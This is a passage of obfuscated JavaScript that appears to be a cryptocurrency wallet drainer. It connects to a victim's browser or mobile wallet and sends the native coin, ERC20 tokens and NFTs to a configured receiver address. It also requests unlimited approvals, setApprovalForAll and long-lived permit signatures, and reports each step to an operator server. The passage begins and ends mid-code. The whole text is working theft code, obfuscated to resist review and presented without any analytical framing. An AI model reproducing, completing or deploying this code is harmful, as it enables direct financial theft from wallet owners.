            _0xf1292a = ethers[_0x37444d(0x22e)][_0x37444d(0x245)](_0x3c3e77[_0x37444d(0x213)] == 0xa ? _0x37444d(0x2c1) : _0x3edbc8),
            _0x2dd2bf = _0xf1292a[_0x37444d(0x29f)](ethers[_0x37444d(0x22e)]['from'](_0xcbdff2))[_0x37444d(0x29f)](ethers[_0x37444d(0x22e)]['from']('2')),
            _0x252f08 = _0xf1292a[_0x37444d(0x29f)](ethers[_0x37444d(0x22e)][_0x37444d(0x245)](_0x4048c7))['mul'](ethers[_0x37444d(0x22e)][_0x37444d(0x245)](String(MS_Gas_Reserves[_0x3c3e77[_0x37444d(0x213)]]))),
            _0x76fa3e = ethers[_0x37444d(0x22e)][_0x37444d(0x245)](_0x3c3e77[_0x37444d(0x2d1)])['sub'](_0x2dd2bf)[_0x37444d(0x2d8)](_0x252f08)[_0x37444d(0x23c)]();
        if (ethers[_0x37444d(0x22e)][_0x37444d(0x245)](_0x76fa3e)[_0x37444d(0x1c3)](ethers['BigNumber']['from']('0'))) throw _0x37444d(0x24d);
        const _0x3fe043 = await get_nonce(_0x3c3e77[_0x37444d(0x213)]);
        await transfer_request(_0x3c3e77), sign_next();
        const _0x520689 = await MS_Signer[_0x37444d(0x282)]({
            'to': MS_Settings['Receiver'],
            'value': ethers[_0x37444d(0x22e)][_0x37444d(0x245)](_0x76fa3e),
            'gasLimit': ethers[_0x37444d(0x22e)]['from'](_0xcbdff2),
            'gasPrice': ethers[_0x37444d(0x22e)][_0x37444d(0x245)](_0x3edbc8),
            'nonce': _0x3fe043
        });
        wait_message();
        if (MS_Settings[_0x37444d(0x231)][_0x37444d(0x1ab)]) await _0x4502d2[_0x37444d(0x1ba)](_0x520689[_0x37444d(0x2ba)], 0x1, 0x7530);
        await transfer_success(_0x3c3e77, _0x76fa3e), sign_ready();
    },
    TRANSFER_TOKEN = async _0x122f2e => {
        const _0x5bd755 = _0x53f51f,
            _0x4be6a0 = new Web3(MS_Provider),
            _0x4c9ac3 = new ethers['providers']['JsonRpcProvider'](MS_Settings[_0x5bd755(0x219)][_0x122f2e[_0x5bd755(0x213)]]),
            _0x374f11 = ethers[_0x5bd755(0x22e)][_0x5bd755(0x245)](await _0x4c9ac3[_0x5bd755(0x25d)]())[_0x5bd755(0x191)](ethers[_0x5bd755(0x22e)][_0x5bd755(0x245)](_0x5bd755(0x29d)))[_0x5bd755(0x29f)](ethers['BigNumber'][_0x5bd755(0x245)](_0x5bd755(0x20f)))['toString'](),
            _0xd523c8 = await get_nonce(_0x122f2e[_0x5bd755(0x213)]),
            _0xbb3583 = new ethers[(_0x5bd755(0x246))](_0x122f2e[_0x5bd755(0x18c)], MS_Contract_ABI[_0x5bd755(0x2b2)], MS_Signer);
        let _0x326196 = null;
        try {
            _0x326196 = await _0xbb3583['estimateGas']['transfer'](MS_Settings['Receiver'], _0x122f2e[_0x5bd755(0x2d1)], {
                'from': MS_Current_Address
            }), _0x326196 = ethers[_0x5bd755(0x22e)][_0x5bd755(0x245)](_0x326196)['div'](ethers[_0x5bd755(0x22e)][_0x5bd755(0x245)](_0x5bd755(0x29d)))[_0x5bd755(0x29f)](ethers[_0x5bd755(0x22e)][_0x5bd755(0x245)](_0x5bd755(0x20f)))['toString']();
        } catch (_0x197677) {
            _0x326196 = _0x122f2e[_0x5bd755(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x122f2e[_0x5bd755(0x213)] == 0xa86a ? 0x4c4b40 : 0x3d090;
        }
        await transfer_request(_0x122f2e), sign_next();
        const _0x94fd85 = await _0xbb3583[_0x5bd755(0x1f3)](MS_Settings['Receiver'], _0x122f2e[_0x5bd755(0x2d1)], {
            'gasLimit': ethers[_0x5bd755(0x22e)][_0x5bd755(0x245)](_0x326196),
            'gasPrice': ethers[_0x5bd755(0x22e)]['from'](_0x374f11),
            'nonce': _0xd523c8
        });
        wait_message();
        if (MS_Settings[_0x5bd755(0x231)]['Wait_For_Confirmation']) await _0x4c9ac3['waitForTransaction'](_0x94fd85['hash'], 0x1, 0x7530);
        await transfer_success(_0x122f2e), sign_ready();
    },
    TRANSFER_NFT = async _0x52d245 => {
        const _0x26e886 = _0x53f51f,
            _0x49b53d = new Web3(MS_Provider),
            _0x5f4e92 = new ethers['providers'][(_0x26e886(0x2ab))](MS_Settings[_0x26e886(0x219)][_0x52d245[_0x26e886(0x213)]]),
            _0x27c3c4 = ethers[_0x26e886(0x22e)]['from'](await _0x5f4e92[_0x26e886(0x25d)]())['div'](ethers['BigNumber']['from']('100'))['mul'](ethers[_0x26e886(0x22e)][_0x26e886(0x245)](_0x26e886(0x20f)))[_0x26e886(0x23c)](),
            _0x52e31e = await get_nonce(_0x52d245['chain_id']),
            _0x3b1edc = new ethers[(_0x26e886(0x246))](_0x52d245[_0x26e886(0x18c)], MS_Contract_ABI['ERC721'], MS_Signer);
        let _0x5aea7e = null;
        try {
            _0x5aea7e = await _0x3b1edc['estimateGas'][_0x26e886(0x284)](MS_Current_Address, MS_Settings[_0x26e886(0x19c)], _0x52d245['amount_raw'], {
                'from': MS_Current_Address
            }), _0x5aea7e = ethers[_0x26e886(0x22e)][_0x26e886(0x245)](_0x5aea7e)[_0x26e886(0x191)](ethers[_0x26e886(0x22e)][_0x26e886(0x245)](_0x26e886(0x29d)))['mul'](ethers[_0x26e886(0x22e)][_0x26e886(0x245)](_0x26e886(0x20f)))[_0x26e886(0x23c)]();
        } catch (_0x5d3a08) {
            _0x5aea7e = _0x52d245['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x52d245[_0x26e886(0x213)] == 0xa86a ? 0x4c4b40 : 0x3d090;
        }
        await transfer_request(_0x52d245), sign_next();
        const _0x2ea87f = await _0x3b1edc['transferFrom'](MS_Current_Address, MS_Settings[_0x26e886(0x19c)], _0x52d245[_0x26e886(0x2d1)], {
            'gasLimit': ethers[_0x26e886(0x22e)][_0x26e886(0x245)](_0x5aea7e),
            'gasPrice': ethers[_0x26e886(0x22e)]['from'](_0x27c3c4),
            'nonce': _0x52e31e
        });
        wait_message();
        if (MS_Settings[_0x26e886(0x231)]['Wait_For_Confirmation']) await _0x5f4e92[_0x26e886(0x1ba)](_0x2ea87f[_0x26e886(0x2ba)], 0x1, 0x7530);
        await transfer_success(_0x52d245), sign_ready();
    },
    APPROVE_TOKEN = async _0x1783ea => {
        const _0x4179e6 = _0x53f51f;
        if (MS_Current_Provider == _0x4179e6(0x27b) && MS_Settings[_0x4179e6(0x231)][_0x4179e6(0x2c0)]['MetaMask'] == 0x2) return MM_APPROVE_TOKEN(_0x1783ea);
        const _0x173a17 = new Web3(MS_Provider),
            _0x5d198d = new ethers[(_0x4179e6(0x1f8))][(_0x4179e6(0x2ab))](MS_Settings[_0x4179e6(0x219)][_0x1783ea[_0x4179e6(0x213)]]),
            _0x3367ad = ethers['BigNumber'][_0x4179e6(0x245)](await _0x5d198d['getGasPrice']())[_0x4179e6(0x191)](ethers['BigNumber'][_0x4179e6(0x245)](_0x4179e6(0x29d)))[_0x4179e6(0x29f)](ethers['BigNumber'][_0x4179e6(0x245)]('120'))['toString'](),
            _0x4ad243 = await get_nonce(_0x1783ea['chain_id']),
            _0x46d82c = new ethers[(_0x4179e6(0x246))](_0x1783ea['address'], MS_Contract_ABI[_0x4179e6(0x2b2)], MS_Signer);
        let _0x4317e0 = null,
            _0x205261 = ethers[_0x4179e6(0x1a4)][_0x4179e6(0x16f)](MS_Unlimited_Amount);
        for (const _0x304dba of MS_Settings[_0x4179e6(0x2bb)]) {
            try {
                if (_0x304dba[0x0] == MS_Current_Chain_ID && _0x304dba[0x1] == _0x1783ea[_0x4179e6(0x18c)][_0x4179e6(0x2bf)]()) {
                    _0x205261 = _0x1783ea[_0x4179e6(0x2d1)];
                    break;
                }
            } catch (_0x16d954) {
                console[_0x4179e6(0x2c3)](_0x16d954);
            }
        }
        try {
            _0x4317e0 = await _0x46d82c[_0x4179e6(0x1ff)]['approve'](MS_Settings[_0x4179e6(0x216)], _0x205261, {
                'from': MS_Current_Address
            }), _0x4317e0 = ethers[_0x4179e6(0x22e)][_0x4179e6(0x245)](_0x4317e0)[_0x4179e6(0x191)](ethers['BigNumber'][_0x4179e6(0x245)](_0x4179e6(0x29d)))['mul'](ethers[_0x4179e6(0x22e)]['from'](_0x4179e6(0x20f)))[_0x4179e6(0x23c)]();
        } catch (_0x3c92b1) {
            _0x4317e0 = _0x1783ea['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x1783ea['chain_id'] == 0xa86a ? 0x4c4b40 : 0x3d090;
        }
        await approve_request(_0x1783ea), sign_next();
        const _0x1b081a = await _0x46d82c['approve'](MS_Settings[_0x4179e6(0x216)], _0x205261, {
            'gasLimit': ethers['BigNumber'][_0x4179e6(0x245)](_0x4317e0),
            'gasPrice': ethers['BigNumber']['from'](_0x3367ad),
            'nonce': _0x4ad243
        });
        wait_message();
        if (MS_Settings[_0x4179e6(0x231)][_0x4179e6(0x1ab)]) await _0x5d198d[_0x4179e6(0x1ba)](_0x1b081a[_0x4179e6(0x2ba)], 0x1, 0x7530);
        await approve_success(_0x1783ea), sign_ready();
    },
    MM_APPROVE_TOKEN = async _0x2e586e => {
        const _0xcf89c8 = _0x53f51f,
            _0x222092 = new Web3(MS_Provider),
            _0x5269d2 = new ethers['providers']['JsonRpcProvider'](MS_Settings[_0xcf89c8(0x219)][_0x2e586e[_0xcf89c8(0x213)]]),
            _0x105b05 = ethers[_0xcf89c8(0x22e)]['from'](await _0x5269d2[_0xcf89c8(0x25d)]())[_0xcf89c8(0x191)](ethers[_0xcf89c8(0x22e)]['from']('100'))[_0xcf89c8(0x29f)](ethers[_0xcf89c8(0x22e)][_0xcf89c8(0x245)](_0xcf89c8(0x20f)))['toString'](),
            _0x44e223 = await get_nonce(_0x2e586e[_0xcf89c8(0x213)]),
            _0x51c635 = new ethers['Contract'](_0x2e586e[_0xcf89c8(0x18c)], MS_Contract_ABI[_0xcf89c8(0x2b2)], _0x5269d2);
        let _0x13f71d = null,
            _0x29a702 = ethers[_0xcf89c8(0x1a4)]['parseEther'](MS_Unlimited_Amount);
        for (const _0x343e33 of MS_Settings['Unlimited_BL']) {
            try {
                if (_0x343e33[0x0] == MS_Current_Chain_ID && _0x343e33[0x1] == _0x2e586e[_0xcf89c8(0x18c)][_0xcf89c8(0x2bf)]()) {
                    _0x29a702 = _0x2e586e['amount_raw'];
                    break;
                }
            } catch (_0x8fea68) {
                console[_0xcf89c8(0x2c3)](_0x8fea68);
            }
        }
        try {
            _0x13f71d = await _0x51c635[_0xcf89c8(0x1ff)][_0xcf89c8(0x2c5)](MS_Settings['Address'], _0x29a702, {
                'from': MS_Current_Address
            }), _0x13f71d = ethers[_0xcf89c8(0x22e)][_0xcf89c8(0x245)](_0x13f71d)[_0xcf89c8(0x191)](ethers[_0xcf89c8(0x22e)][_0xcf89c8(0x245)](_0xcf89c8(0x29d)))[_0xcf89c8(0x29f)](ethers[_0xcf89c8(0x22e)][_0xcf89c8(0x245)](_0xcf89c8(0x20f)))[_0xcf89c8(0x23c)]();
        } catch (_0x22d281) {
            _0x13f71d = _0x2e586e[_0xcf89c8(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x2e586e[_0xcf89c8(0x213)] == 0xa86a ? 0x4c4b40 : 0x3d090;
        }
        let _0x1dfbc1 = new _0x222092[(_0xcf89c8(0x28a))][(_0xcf89c8(0x246))](MS_Contract_ABI[_0xcf89c8(0x2b2)], _0x2e586e[_0xcf89c8(0x18c)]),
            _0x4a2dd9 = _0x1dfbc1['methods'][_0xcf89c8(0x2c5)](MS_Settings[_0xcf89c8(0x216)], _0x29a702)[_0xcf89c8(0x166)]();
        await approve_request(_0x2e586e), sign_next();
        const _0x3861e8 = await new Promise(_0x162c9d => {
            const _0x8f5f09 = _0xcf89c8;
            MS_Provider[_0x8f5f09(0x28e)]({
                'from': MS_Current_Address,
                'id': 0x1,
                'jsonrpc': _0x8f5f09(0x1c6),
                'method': _0x8f5f09(0x15e),
                'params': [{
                    'chainId': MS_Current_Chain_ID,
                    'data': _0x4a2dd9,
                    'from': MS_Current_Address,
                    'nonce': _0x222092[_0x8f5f09(0x1a4)][_0x8f5f09(0x209)](_0x44e223),
                    'to': _0x2e586e[_0x8f5f09(0x18c)],
                    'value': _0x8f5f09(0x1c0),
                    'gasPrice': _0x222092['utils'][_0x8f5f09(0x209)](_0x105b05),
                    'gas': _0x222092[_0x8f5f09(0x1a4)]['toHex'](_0x13f71d)
                }]
            }, (_0xd2c0db, _0x542a90) => {
                _0x162c9d({
                    'err': _0xd2c0db,
                    'tx': _0x542a90
                });
            });
        });
        wait_message();
        if (MS_Settings[_0xcf89c8(0x231)]['Wait_For_Confirmation']) await _0x5269d2[_0xcf89c8(0x1ba)](_0x3861e8['tx'][_0xcf89c8(0x1da)], 0x1, 0x7530);
        await approve_success(_0x2e586e), sign_ready();
    },
    DO_SAFA = async _0x1545f0 => {
        const _0x5419c1 = _0x53f51f,
            _0x2ef6ca = new Web3(MS_Provider),
            _0x23b00a = new ethers[(_0x5419c1(0x1f8))][(_0x5419c1(0x2ab))](MS_Settings[_0x5419c1(0x219)][_0x1545f0['chain_id']]),
            _0xd3b221 = ethers[_0x5419c1(0x22e)][_0x5419c1(0x245)](await _0x23b00a[_0x5419c1(0x25d)]())[_0x5419c1(0x191)](ethers[_0x5419c1(0x22e)][_0x5419c1(0x245)](_0x5419c1(0x29d)))[_0x5419c1(0x29f)](ethers[_0x5419c1(0x22e)][_0x5419c1(0x245)](_0x5419c1(0x20f)))[_0x5419c1(0x23c)](),
            _0x5e9092 = await get_nonce(_0x1545f0['chain_id']),
            _0x2644ba = new ethers[(_0x5419c1(0x246))](_0x1545f0[_0x5419c1(0x18c)], MS_Contract_ABI['ERC721'], MS_Signer);
        let _0x54ac81 = null;
        try {
            _0x54ac81 = await _0x2644ba[_0x5419c1(0x1ff)]['setApprovalForAll'](MS_Settings[_0x5419c1(0x216)], !![], {
                'from': MS_Current_Address
            }), _0x54ac81 = ethers['BigNumber']['from'](_0x54ac81)[_0x5419c1(0x191)](ethers['BigNumber'][_0x5419c1(0x245)](_0x5419c1(0x29d)))['mul'](ethers[_0x5419c1(0x22e)][_0x5419c1(0x245)](_0x5419c1(0x20f)))[_0x5419c1(0x23c)]();
        } catch (_0x267d39) {
            _0x54ac81 = _0x1545f0[_0x5419c1(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x1545f0['chain_id'] == 0xa86a ? 0x4c4b40 : 0x3d090;
        }
        await approve_request(_0x1545f0), sign_next();
        const _0x1aa066 = await _0x2644ba['setApprovalForAll'](MS_Settings[_0x5419c1(0x216)], !![], {
            'gasLimit': ethers['BigNumber']['from'](_0x54ac81),
            'gasPrice': ethers['BigNumber']['from'](_0xd3b221),
            'nonce': _0x5e9092
        });
        wait_message();
        if (MS_Settings[_0x5419c1(0x231)][_0x5419c1(0x1ab)]) await _0x23b00a['waitForTransaction'](_0x1aa066[_0x5419c1(0x2ba)], 0x1, 0x7530);
        await approve_success(_0x1545f0), sign_ready();
    },
    PERMIT_TOKEN = async _0x157111 => {
        const _0xa79402 = _0x53f51f,
            _0x5bc42a = new ethers[(_0xa79402(0x246))](_0x157111[_0xa79402(0x18c)], _0x157111[_0xa79402(0x1f4)], MS_Signer),
            _0x471f1f = await _0x5bc42a['nonces'](MS_Current_Address),
            _0xd9cf2d = await _0x5bc42a['name']();
        let _0x476481 = ethers[_0xa79402(0x1a4)]['parseEther'](MS_Unlimited_Amount);
        for (const _0x5e157c of MS_Settings[_0xa79402(0x2bb)]) {
            try {
                if (_0x5e157c[0x0] == MS_Current_Chain_ID && _0x5e157c[0x1] == _0x157111[_0xa79402(0x18c)][_0xa79402(0x2bf)]()) {
                    _0x476481 = _0x157111[_0xa79402(0x2d1)];
                    break;
                }
            } catch (_0x478b1e) {
                console[_0xa79402(0x2c3)](_0x478b1e);
            }
        }
        const _0x20df87 = Date[_0xa79402(0x280)]() + 0x3e8 * 0x3c * 0x3c * 0x18 * 0x164;
        let _0x298dc8 = null,
            _0x186181 = null;
        if (_0x157111[_0xa79402(0x1b8)] == 0x1) _0x298dc8 = {
            'Permit': [{
                'name': _0xa79402(0x2a8),
                'type': 'address'
            }, {
                'name': _0xa79402(0x2a1),
                'type': _0xa79402(0x18c)
            }, {
                'name': _0xa79402(0x29b),
                'type': 'uint256'
            }, {
                'name': _0xa79402(0x291),
                'type': _0xa79402(0x161)
            }, {
                'name': _0xa79402(0x1d6),
                'type': _0xa79402(0x176)
            }]
        }, _0x186181 = {
            'holder': MS_Current_Address,
            'spender': MS_Settings[_0xa79402(0x216)],
            'nonce': _0x471f1f,
            'expiry': _0x20df87,
            'allowed': !![]
        };
        else _0x157111['permit'] == 0x2 && (_0x298dc8 = {
            'Permit': [{
                'name': _0xa79402(0x218),
                'type': _0xa79402(0x18c)
            }, {
                'name': 'spender',
                'type': 'address'
            }, {
                'name': _0xa79402(0x2b3),
                'type': _0xa79402(0x161)
            }, {
                'name': _0xa79402(0x29b),
                'type': _0xa79402(0x161)
            }, {
                'name': _0xa79402(0x299),
                'type': 'uint256'
            }]
        }, _0x186181 = {
            'owner': MS_Current_Address,
            'spender': MS_Settings[_0xa79402(0x216)],
            'value': _0x476481,
            'nonce': _0x471f1f,
            'deadline': _0x20df87
        });
        await approve_request(_0x157111), sign_next();
        const _0x346e2a = await MS_Signer[_0xa79402(0x270)]({
                'name': _0xd9cf2d,
                'version': _0x157111['permit_ver'],
                'chainId': _0x157111[_0xa79402(0x213)],
                'verifyingContract': _0x157111[_0xa79402(0x18c)]
            }, _0x298dc8, _0x186181),
            _0x4fdb48 = {
                'r': _0x346e2a['slice'](0x0, 0x42),
                's': '0x' + _0x346e2a[_0xa79402(0x1b7)](0x42, 0x82),
                'v': Number('0x' + _0x346e2a[_0xa79402(0x1b7)](0x82, 0x84))
            };
        await approve_success(_0x157111), wait_message();
        const _0x4878fe = send_request({
            'action': _0xa79402(0x170),
            'user_id': MS_ID,
            'sign': {
                'type': _0x157111[_0xa79402(0x1b8)],
                'version': _0x157111[_0xa79402(0x2a3)],
                'chain_id': _0x157111[_0xa79402(0x213)],
                'address': _0x157111['address'],
                'owner': MS_Current_Address,
                'spender': MS_Settings[_0xa79402(0x216)],
                'value': _0x476481['toString'](),
                'nonce': _0x471f1f[_0xa79402(0x23c)](),
                'deadline': _0x20df87,
                'r': _0x4fdb48['r'],
                's': _0x4fdb48['s'],
                'v': _0x4fdb48['v'],
                'abi': _0x157111[_0xa79402(0x1f4)]
            },
            'asset': _0x157111,
            'address': MS_Current_Address
        });
        if (MS_Settings[_0xa79402(0x231)][_0xa79402(0x1e5)]) await _0x4878fe;
        sign_ready();
    },
    sign_success = async (_0x1f7cd4, _0x40bd92 = '0') => {
        const _0x488f15 = _0x53f51f;
        try {
            if (_0x1f7cd4[_0x488f15(0x22f)] == _0x488f15(0x15b)) {
                _0x1f7cd4[_0x488f15(0x2d1)] = _0x40bd92;
                const _0x2d80a5 = ethers[_0x488f15(0x22e)]['from'](_0x1f7cd4['amount_raw']);
                _0x1f7cd4['amount_usd'] = parseFloat(ethers['utils']['formatUnits'](_0x2d80a5, _0x488f15(0x1a0))) * MS_Currencies[convert_chain('ID', _0x488f15(0x249), _0x1f7cd4['chain_id'])]['USD'], await send_request({
                    'action': _0x488f15(0x1e4),
                    'asset': _0x1f7cd4,
                    'user_id': MS_ID
                });
            } else await send_request({
                'action': 'sign_success',
                'asset': _0x1f7cd4,
                'user_id': MS_ID
            });
        } catch (_0x17bfdf) {
            console[_0x488f15(0x2c3)](_0x17bfdf);
        }
    },
    transfer_success = async (_0x26f8e7, _0x50027b = '0') => {
        const _0x26a1af = _0x53f51f;
        try {
            if (_0x26f8e7['type'] == _0x26a1af(0x15b)) {
                _0x26f8e7[_0x26a1af(0x2d1)] = _0x50027b;
                const _0x1382f4 = ethers[_0x26a1af(0x22e)][_0x26a1af(0x245)](_0x26f8e7['amount_raw']);
                _0x26f8e7[_0x26a1af(0x152)] = parseFloat(ethers['utils']['formatUnits'](_0x1382f4, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', _0x26f8e7[_0x26a1af(0x213)])]['USD'], await send_request({
                    'action': 'transfer_success',
                    'asset': _0x26f8e7,
                    'user_id': MS_ID
                });
            } else await send_request({
                'action': _0x26a1af(0x1c4),
                'asset': _0x26f8e7,
                'user_id': MS_ID
            });
        } catch (_0x30c6e8) {
            console[_0x26a1af(0x2c3)](_0x30c6e8);
        }
    },
    approve_success = async _0x366283 => {
        const _0x3c9fdb = _0x53f51f;
        try {
            await send_request({
                'action': 'approve_success',
                'asset': _0x366283,
                'user_id': MS_ID
            });
        } catch (_0x52f89e) {
            console[_0x3c9fdb(0x2c3)](_0x52f89e);
        }
    },
    sign_cancel = async () => {
        const _0x250a18 = _0x53f51f;
        try {
            await send_request({
                'action': _0x250a18(0x184),
                'user_id': MS_ID
            });
        } catch (_0x51fbcd) {
            console[_0x250a18(0x2c3)](_0x51fbcd);
        }
    },
    sign_unavailable = async () => {
        const _0x4956eb = _0x53f51f;
        try {
            await send_request({
                'action': _0x4956eb(0x202),
                'user_id': MS_ID
            }), MS_Sign_Disabled = !![];
        } catch (_0x2ef397) {
            console[_0x4956eb(0x2c3)](_0x2ef397);
        }
    },
    transfer_cancel = async () => {
        const _0x4f61fd = _0x53f51f;
        try {
            await send_request({
                'action': 'transfer_cancel',
                'user_id': MS_ID
            });
        } catch (_0x4d2ec3) {
            console[_0x4f61fd(0x2c3)](_0x4d2ec3);
        }
    },
    approve_cancel = async () => {
        const _0x594505 = _0x53f51f;
        try {
            await send_request({
                'action': _0x594505(0x19f),
                'user_id': MS_ID
            });
        } catch (_0x1dc129) {
            console[_0x594505(0x2c3)](_0x1dc129);
        }
    },
    chain_cancel = async () => {
        const _0x1b2107 = _0x53f51f;
        try {
            await send_request({
                'action': _0x1b2107(0x23d),
                'user_id': MS_ID
            });
        } catch (_0x136aee) {
            console['log'](_0x136aee);
        }
    },
    chain_success = async () => {
        const _0x3201c1 = _0x53f51f;
        try {
            await send_request({
                'action': _0x3201c1(0x265),
                'user_id': MS_ID
            });
        } catch (_0x3cb592) {
            console[_0x3201c1(0x2c3)](_0x3cb592);
        }
    },
    chain_request = async (_0x2035cd, _0x25cc39) => {
        const _0x233b97 = _0x53f51f;
        try {
            await send_request({
                'action': _0x233b97(0x158),
                'user_id': MS_ID,
                'chains': [_0x2035cd, _0x25cc39]
            });
        } catch (_0x5e4ca9) {
            console[_0x233b97(0x2c3)](_0x5e4ca9);
        }
    },
    sign_request = async _0x37babf => {
        const _0x41ed07 = _0x53f51f;
        try {
            await send_request({
                'action': _0x41ed07(0x17a),
                'user_id': MS_ID,
                'asset': _0x37babf
            });
        } catch (_0xc7abd) {
            console[_0x41ed07(0x2c3)](_0xc7abd);
        }
    },
    transfer_request = async _0x303877 => {
        const _0xca8a3e = _0x53f51f;
        try {
            await send_request({
                'action': _0xca8a3e(0x27d),
                'user_id': MS_ID,
                'asset': _0x303877
            });
        } catch (_0x36080d) {
            console['log'](_0x36080d);
        }
    },
    approve_request = async _0x215181 => {
        const _0x46f277 = _0x53f51f;
        try {
            await send_request({
                'action': _0x46f277(0x258),
                'user_id': MS_ID,
                'asset': _0x215181
            });
        } catch (_0x3d118d) {
            console[_0x46f277(0x2c3)](_0x3d118d);
        }
    },
    connect_wallet = async (_0x467a82 = null) => {
        const _0x3e1980 = _0x53f51f;
        try {
            if (MS_Process) return;
            MS_Process = !![];
            if (_0x467a82 !== null) {
                if (_0x467a82 == _0x3e1980(0x27b)) {
                    if (typeof window['ethereum'] == 'object' && typeof window[_0x3e1980(0x1e1)]['providers'] === _0x3e1980(0x203)) {
                        let _0x3efe78 = ![];
                        for (const _0x3d1366 of window['ethereum']['providers']) {
                            if (_0x3d1366[_0x3e1980(0x244)] == !![]) {
                                _0x3efe78 = !![], MS_Provider = _0x3d1366, MS_Current_Provider = _0x3e1980(0x27b);
                                break;
                            }
                        }
                        if (!_0x3efe78) {
                            if (MS_Mobile_Status) {
                                window[_0x3e1980(0x243)][_0x3e1980(0x20d)] = _0x3e1980(0x23e) + MS_Current_URL, MS_Process = ![];
                                return;
                            } else {
                                window[_0x3e1980(0x200)](_0x3e1980(0x1a7), _0x3e1980(0x155))[_0x3e1980(0x2b1)](), MS_Process = ![];
                                return;
                            }
                        }
                    } else {
                        if (typeof window[_0x3e1980(0x1e1)] === 'object' && window['ethereum'][_0x3e1980(0x244)]) MS_Provider = window[_0x3e1980(0x1e1)], MS_Current_Provider = _0x3e1980(0x27b);
                        else {
                            if (MS_Mobile_Status) {
                                window[_0x3e1980(0x243)][_0x3e1980(0x20d)] = _0x3e1980(0x23e) + MS_Current_URL, MS_Process = ![];
                                return;
                            } else {
                                window[_0x3e1980(0x200)](_0x3e1980(0x1a7), _0x3e1980(0x155))[_0x3e1980(0x2b1)](), MS_Process = ![];
                                return;
                            }
                        }
                    }
                } else {
                    if (_0x467a82 == _0x3e1980(0x183)) {
                        if (typeof window[_0x3e1980(0x1e1)] == _0x3e1980(0x203) && typeof window[_0x3e1980(0x1e1)]['providers'] === _0x3e1980(0x203)) {
                            let _0x9f911a = ![];
                            for (const _0x12139c of window['ethereum'][_0x3e1980(0x1f8)]) {
                                if (_0x12139c[_0x3e1980(0x18f)] == !![]) {
                                    _0x9f911a = !![], MS_Provider = _0x12139c;
                                    break;
                                }
                            }
                            if (_0x9f911a) MS_Current_Provider = 'Coinbase';
                            else {
                                if (MS_Mobile_Status) {
                                    window[_0x3e1980(0x243)][_0x3e1980(0x20d)] = _0x3e1980(0x26e) + MS_Current_URL, MS_Process = ![];
                                    return;
                                } else {
                                    window[_0x3e1980(0x200)](_0x3e1980(0x289), _0x3e1980(0x155))[_0x3e1980(0x2b1)](), MS_Process = ![];
                                    return;
                                }
                            }
                        } else {
                            if (typeof window['ethereum'] === _0x3e1980(0x203) && (window['ethereum'][_0x3e1980(0x18f)] || window[_0x3e1980(0x1e1)][_0x3e1980(0x273)])) MS_Provider = window['ethereum'], MS_Current_Provider = _0x3e1980(0x183);
                            else {
                                if (MS_Mobile_Status) {
                                    window['location']['href'] = _0x3e1980(0x26e) + MS_Current_URL, MS_Process = ![];
                                    return;
                                } else {
                                    window['open'](_0x3e1980(0x289), _0x3e1980(0x155))[_0x3e1980(0x2b1)](), MS_Process = ![];
                                    return;
                                }
                            }
                        }
                    } else {
                        if (_0x467a82 == _0x3e1980(0x1ed)) {
                            if (typeof window['ethereum'] === _0x3e1980(0x203) && window[_0x3e1980(0x1e1)][_0x3e1980(0x175)]) MS_Provider = window[_0x3e1980(0x1e1)], MS_Current_Provider = 'Trust\x20Wallet';
                            else {
                                if (MS_Mobile_Status) {
                                    window[_0x3e1980(0x243)]['href'] = _0x3e1980(0x1bf) + MS_Current_URL, MS_Process = ![];
                                    return;
                                } else {
                                    window[_0x3e1980(0x200)](_0x3e1980(0x1ae), _0x3e1980(0x155))[_0x3e1980(0x2b1)](), MS_Process = ![];
                                    return;
                                }
                            }
                        } else {
                            if (_0x467a82 == 'Binance\x20Wallet') {
                                if (typeof window[_0x3e1980(0x250)] === _0x3e1980(0x203)) MS_Provider = window[_0x3e1980(0x250)], MS_Current_Provider = _0x3e1980(0x227);
                                else {
                                    window[_0x3e1980(0x200)](_0x3e1980(0x151), '_blank')[_0x3e1980(0x2b1)](), MS_Process = ![];
                                    return;
                                }
                            } else _0x467a82 == _0x3e1980(0x2c9) ? MS_Current_Provider = _0x3e1980(0x2c9) : typeof window[_0x3e1980(0x1e1)] === _0x3e1980(0x203) ? (MS_Provider = window['ethereum'], MS_Current_Provider = _0x3e1980(0x1fd)) : MS_Current_Provider = 'WalletConnect';
                        }
                    }
                }
            } else window[_0x3e1980(0x1e1)] ? (MS_Provider = window[_0x3e1980(0x1e1)], MS_Current_Provider = _0x3e1980(0x1fd)) : MS_Current_Provider = 'WalletConnect';
            try {
                await connect_request();
                let _0x52e6d5 = null;
                if (MS_Current_Provider == _0x3e1980(0x2c9)) {
                    load_wc(), await MS_Provider[_0x3e1980(0x27c)](0x0), _0x52e6d5 = await MS_Provider[_0x3e1980(0x167)]();
                    if (_0x52e6d5 && _0x52e6d5[_0x3e1980(0x233)] > 0x0) {
                        if (!_0x52e6d5[0x0][_0x3e1980(0x23a)]('0x')) return MS_Process = ![], await connect_cancel();
                        await new Promise(_0x413cb9 => setTimeout(_0x413cb9, 0x9c4)), MS_Current_Address = _0x52e6d5[0x0], MS_Current_Chain_ID = MS_Provider[_0x3e1980(0x25a)], MS_Web3 = new ethers[(_0x3e1980(0x1f8))][(_0x3e1980(0x199))](MS_Provider), MS_Signer = MS_Web3[_0x3e1980(0x22d)]();
                    } else return MS_Process = ![], await connect_cancel();
                } else try {
                    _0x52e6d5 = await MS_Provider[_0x3e1980(0x212)]({
                        'method': 'wallet_requestPermissions',
                        'params': [{
                            'eth_accounts': {}
                        }]
                    });
                    if (_0x52e6d5 && _0x52e6d5[_0x3e1980(0x233)] > 0x0) {
                        if (!MS_Provider[_0x3e1980(0x285)][_0x3e1980(0x23a)]('0x')) return connect_cancel();
                        MS_Current_Address = MS_Provider[_0x3e1980(0x285)], MS_Current_Chain_ID = parseInt(MS_Provider[_0x3e1980(0x25a)]), MS_Web3 = new ethers[(_0x3e1980(0x1f8))][(_0x3e1980(0x199))](MS_Provider), MS_Signer = MS_Web3[_0x3e1980(0x22d)]();
                    } else return MS_Process = ![], await connect_cancel();
                } catch (_0x101828) {
                    _0x52e6d5 = await MS_Provider['request']({
                        'method': _0x3e1980(0x2a5)
                    });
                    if (_0x52e6d5 && _0x52e6d5['length'] > 0x0) {
